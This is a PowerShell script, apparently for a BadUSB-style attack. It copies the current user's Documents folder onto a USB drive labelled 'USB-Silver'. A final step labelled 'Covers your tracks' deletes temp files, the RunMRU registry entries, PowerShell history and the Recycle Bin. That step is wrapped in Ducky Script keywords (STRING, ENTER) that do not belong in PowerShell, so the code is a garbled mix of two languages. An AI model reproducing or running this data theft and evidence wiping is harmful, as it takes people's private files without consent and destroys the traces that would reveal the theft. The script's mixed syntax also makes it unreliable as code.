# 1. Dynamically determine the user profile path (e.g., C:\Users\YourName)
$userFolder = $env:USERPROFILE

# 2. TO CONFIGURE: Which folder do you want to copy? 
# Example: The current user's "Documents" folder
$sourceDir = "$userFolder\Documents"

# Alternatively, you can specify a custom path:
# $sourceDir = "C:\YourPath\YourFolder"


# 3. Search for a USB drive with the exact Volume Label "USB-Silver"
Write-Host "[*] Searching for USB drive 'USB-Silver'..." -ForegroundColor Cyan
$usbDrive = Get-Volume | Where-Object { $_.FileSystemLabel -eq "USB-Silver" } | Select-Object -ExpandProperty DriveLetter

# Check if the USB drive was found
if (-not $usbDrive) {
    Write-Host "[!] Error: No USB drive with the name 'USB-Silver' found!" -ForegroundColor Red
    Start-Sleep -Seconds 5
    exit
}

# Convert the drive letter into a valid path (e.g., "E:\")
$destRoot = "${usbDrive}:\"
$destDir = Join-Path $destRoot "Copied_Data"

Write-Host "[+] USB drive found on drive letter: $destRoot" -ForegroundColor Green

# 4. Create the destination folder on the USB stick (if it doesn't exist yet)
if (-not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir | Out-Null
}

# 5. Start the copy process (Robocopy is fast and reliable for entire directory trees)
Write-Host "[*] Copying data to $destDir ..." -ForegroundColor Yellow
robocopy "$sourceDir" "$destDir" /E /R:2 /W:2

# 6. Covers your tracks by deleting anything you might have left on the System.
STRING rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue; reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue; Clear-RecycleBin -Force -ErrorAction SilentlyContinue
ENTER

Write-Host "[+] Copy process completed!" -ForegroundColor Green
Start-Sleep -Seconds 3